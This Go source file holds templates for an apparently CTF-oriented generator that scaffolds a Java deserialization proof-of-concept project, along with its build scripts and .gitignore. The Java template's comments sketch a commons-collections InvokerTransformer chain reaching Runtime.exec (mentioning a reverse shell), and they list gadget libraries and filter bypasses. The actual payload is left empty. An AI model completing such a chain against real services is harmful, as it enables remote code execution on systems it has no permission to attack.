// Package generator 生成 pom.xml / Poc.java / README / 脚本 / .gitignore。
//
// 对应原 Python 版 create-ctf-poc.py 的 Generator + Template 层。
// 模板内容（Poc.java、compile-run.sh/.bat、.gitignore）逐字复刻，
// 用 Go 反引号原始字符串字面量保存，保证字符级一致。
package generator

// PocJavaTemplate 是反序列化 POC 模板。
// 含完整中文注释、getGadget/deserialize/main 方法，以及反射辅助工具。
const PocJavaTemplate = `package ctf.poc;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Base64;

/**
 * CTF Java 反序列化 POC 模板
 * <p>
 * 由 ctf-pocgen 自动生成。本模板已经把反序列化 POC 的常用骨架搭好，
 * 你只需要专注于 {@link #getGadget()} —— 构造利用链 / gadget 链。
 * <p>
 * 思路提示：
 *   1. 用 jd-gui / jadx / CFR 反编译 lib/challenge-classes.jar，定位题目自定义类
 *      （尤其注意 InvocationHandler、equals/hashCode/compare/readObject 等触发点）。
 *   2. 检查 lib/ 下有哪些第三方库可作 gadget：
 *        - commons-collections 3.x        -> CC1/CC6/LazyMap
 *        - commons-collections 4.x        -> CC2/CC4/PriorityQueue
 *        - commons-beanutils              -> BeanComparator
 *        - fastjson / jackson             -> 反序列化触发 JNDI
 *        - shiro                          -> rememberMe AES
 *   3. 如果题目环境存在 SerialKiller / JEP 等反序列化过滤器，需要先绕过黑名单。
 *   4. 生成 payload 后，通常用 base64 编码后通过 HTTP/接口投递，本题可参考
 *      challenge-classes.jar 中的 Controller 寻找入口。
 * <p>
 * 构造 gadget 时常需要操作私有字段 / 调用私有方法 / 绕过 final，
 * 可使用下方的反射辅助方法：{@link #setField}、{@link #getField}、
 * {@link #invokeMethod}、{@link #newInstance}。
 */
public class Poc {

    /**
     * 构造利用链，返回序列化后的字节数组。
     * <p>
     * TODO: 在这里实现你的 gadget 链。下面给出一个占位实现，
     * 实际使用时替换为真实利用链对象。
     *
     * @return 序列化后的 payload 字节
     * @throws Exception 构造过程中的异常
     */
    public static byte[] getGadget() throws Exception {
        // ====== 在此填充利用链 ======
        // 示例（伪代码，需要根据目标实际依赖改写）：
        //
        //   // 1) 准备恶意 Transformer 链 (commons-collections 3.x)
        //   Transformer[] transformers = new Transformer[] {
        //       new ConstantTransformer(Runtime.class),
        //       new InvokerTransformer("getMethod",
        //           new Class[]{String.class, Class[].class},
        //           new Object[]{"getRuntime", new Class[0]}),
        //       new InvokerTransformer("invoke",
        //           new Class[]{Object.class, Object[].class},
        //           new Object[]{null, new Object[0]}),
        //       new InvokerTransformer("exec",
        //           new Class[]{String.class},
        //           new Object[]{"calc"})  // 或反弹 shell 命令
        //   };
        //   ChainedTransformer chain = new ChainedTransformer(transformers);
        //   Map innerMap = new HashMap();
        //   Map lazyMap = LazyMap.decorate(innerMap, chain);
        //
        //   // 2) 用动态代理 / AnnotationInvocationHandler 等触发
        //   Map outerMap = Map.class.cast(Proxy.newProxyInstance(...));
        //
        //   // 3) 序列化
        //   return serialize(outerMap);

        // 占位：返回空数据，便于先验证编译/运行链路通畅
        return new byte[0];
    }

    // ==================== 序列化 / 反序列化 ====================

    /**
     * 把对象序列化为字节数组。
     */
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(obj);
        }
        return baos.toByteArray();
    }

    /**
     * 反序列化字节数据 —— 模拟题目环境 ObjectInputStream.readObject()。
     * <p>
     * 注意：真实题目可能通过 HTTP/RMI/JMX 等通道投递，本方法用于本地自测
     * gadget 是否能触发。如果题目有反序列化过滤器，可在此处模拟。
     */
    public static Object deserialize(byte[] data) throws IOException, ClassNotFoundException {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    // ==================== 反射辅助工具 ====================
    // 构造 gadget 时常需要操作私有字段 / 调用私有方法 / 绕过 final 修饰符，
    // 以下方法封装了 setAccessible(true) 等样板代码，直接调用即可。

    /**
     * 设置对象的字段值（含私有、final 字段）。
     * <p>
     * 对于 final 字段会先清除 modifier 标志位再赋值（JDK 9+ 需配合
     * --add-opens 或反射绕过模块限制）。
     *
     * @param target    目标对象（静态字段传 null + 指定 declaringClass）
     * @param fieldName 字段名
     * @param value     要设置的值
     * @throws Exception 反射过程中的异常
     */
    public static void setField(Object target, String fieldName, Object value) throws Exception {
        Class<?> clazz = (target instanceof Class) ? (Class<?>) target : target.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        // 处理 final 字段：清除 FINAL 标志位
        int mods = field.getModifiers();
        if (Modifier.isFinal(mods)) {
            Field modifiers = Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(field, mods & ~Modifier.FINAL);
        }
        field.set(target, value);
    }

    /**
     * 读取对象的字段值（含私有字段）。
     *
     * @param target    目标对象
     * @param fieldName 字段名
     * @return 字段当前值
     * @throws Exception 反射过程中的异常
     */
    public static Object getField(Object target, String fieldName) throws Exception {
        Class<?> clazz = (target instanceof Class) ? (Class<?>) target : target.getClass();
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(target);
    }

    /**
     * 调用对象的私有方法。
     *
     * @param target        目标对象
     * @param methodName    方法名
     * @param paramTypes    参数类型列表
     * @param args          参数值列表
     * @return 方法返回值
     * @throws Exception 反射过程中的异常
     */
    public static Object invokeMethod(Object target, String methodName, Class<?>[] paramTypes, Object[] args)
            throws Exception {
        Class<?> clazz = (target instanceof Class) ? (Class<?>) target : target.getClass();
        Method method = clazz.getDeclaredMethod(methodName, paramTypes);
        method.setAccessible(true);
        return method.invoke(target, args);
    }

    /**
     * 通过反射创建对象（含调用私有构造器）。
     *
     * @param declaringClass 声明该构造器的类
     * @param paramTypes      构造器参数类型列表
     * @param args            构造器参数值列表
     * @return 新建实例
     * @throws Exception 反射过程中的异常
     */
    @SuppressWarnings("unchecked")
    public static <T> T newInstance(Class<T> declaringClass, Class<?>[] paramTypes, Object[] args)
            throws Exception {
        Constructor<?> constructor = declaringClass.getDeclaredConstructor(paramTypes);
        constructor.setAccessible(true);
        return (T) constructor.newInstance(args);
    }

    // ==================== 入口 ====================

    public static void main(String[] args) {
        try {
            // 1) 构造 payload
            byte[] payload = getGadget();
            System.out.println("[*] payload 长度: " + payload.length + " bytes");

            // 2) 输出 base64，便于通过 HTTP 接口投递
            String b64 = Base64.getEncoder().encodeToString(payload);
            System.out.println("[*] payload (base64):");
            System.out.println(b64);

            if (payload.length == 0) {
                System.out.println("[!] payload 为空，请在 getGadget() 中实现利用链");
            }
            // 注意：不在此自动反序列化触发，避免构造完 gadget 后意外执行。
            // 如需本地自测，手动调用 deserialize(payload) 即可。
        } catch (Exception e) {
            System.out.println("[!] 发生异常:");
            e.printStackTrace();
        }
    }
}
`

// CompileRunSH 是 Linux/macOS 一键编译运行脚本（对应 Python 的 COMPILE_RUN_SH）。
// 逐字复刻，含平台分隔符 uname 检测逻辑。
const CompileRunSH = `#!/usr/bin/env bash
# Compile and run the POC (Linux/macOS) - generated by ctf-pocgen
set -e
cd "$(dirname "$0")"

echo "[*] mvn clean compile ..."
mvn -q clean compile

echo "[*] build classpath (system scope lib/)"
# Classpath separator: ';' on Windows, ':' on Unix-like.
# Note: under Git Bash the Windows java is invoked, so ';' is still needed.
SEP=":"
case "$(uname -s)" in
    MINGW*|MSYS*|CYGWIN*) SEP=";" ;;
esac
CP="target/classes"
while IFS= read -r f; do
    CP="$CP$SEP$f"
done < <(find lib -name '*.jar' | sort)

echo "[*] run ctf.poc.Poc ..."
java -Dfile.encoding=UTF-8 -Dstdout.encoding=UTF-8 -cp "$CP" ctf.poc.Poc
`

// CompileRunBAT 是 Windows 一键编译运行脚本。
// 注意：cmd.exe 按 OEM 代码页（中文系统为 936/GBK）读取/解析 .bat 文件内容，
// chcp 65001 只影响控制台输出，不影响 .bat 自身的解析。因此本模板的 REM 注释与
// echo 文本全部用 ASCII，避免中文被 GBK 误读导致 '锟' is not recognized 报错。
// POC 程序（java）的中文输出由 -Dfile.encoding/-Dstdout.encoding=UTF-8 保证。
// 写入时由 WriteBat 以 UTF-8（无 BOM）+ CRLF 落盘。
const CompileRunBAT = `@echo off
chcp 65001 > nul
REM Compile and run the POC (Windows) - generated by ctf-pocgen
setlocal
cd /d "%~dp0"

echo [*] mvn clean compile ...
call mvn -q clean compile
if errorlevel 1 (
    echo [-] compile failed
    exit /b 1
)

echo [*] build classpath (system scope lib/)
set CP=target\classes
for %%f in (lib\*.jar) do (
    call set "CP=%%CP%%;%%f"
)

echo [*] run ctf.poc.Poc ...
java -Dfile.encoding=UTF-8 -Dstdout.encoding=UTF-8 -cp "%CP%" ctf.poc.Poc
endlocal
`

// GitignoreContent 是 .gitignore 内容（对应 Python 的 GITIGNORE）。
const GitignoreContent = `# Maven
target/
*.class

# IDE
.idea/
*.iml
.vscode/
.settings/
.project
.classpath

# 构建产物 / 临时
cp.txt
*.log

# 注意：lib/ 目录包含题目依赖，体积较大。
# 默认保留在版本控制中以便直接编译；如不需要可取消下一行注释。
# lib/
`
